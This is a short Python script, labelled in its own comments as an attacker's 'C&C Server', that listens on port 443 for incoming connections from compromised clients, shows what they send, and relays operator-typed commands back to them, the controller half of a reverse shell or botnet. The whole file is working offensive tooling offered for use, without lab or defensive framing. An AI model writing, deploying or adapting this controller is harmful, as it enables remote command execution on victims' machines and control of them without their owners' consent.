import socket
import threading

HOST = "192.168.8.107"  # Your IP (attacker's IP)
PORT = 443              # Match this with client

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            print(f"[{addr}] {data.decode(errors='ignore')}")
            command = input(f"Command for {addr} ('exit' to close): ")
            conn.sendall(command.encode())
            if command.lower() == "exit":
                break
    except Exception as e:
        print(f"[-] Error with {addr}: {e}")
    finally:
        conn.close()
        print(f"[-] Disconnected {addr}")

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] C&C Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__":
    start_server()
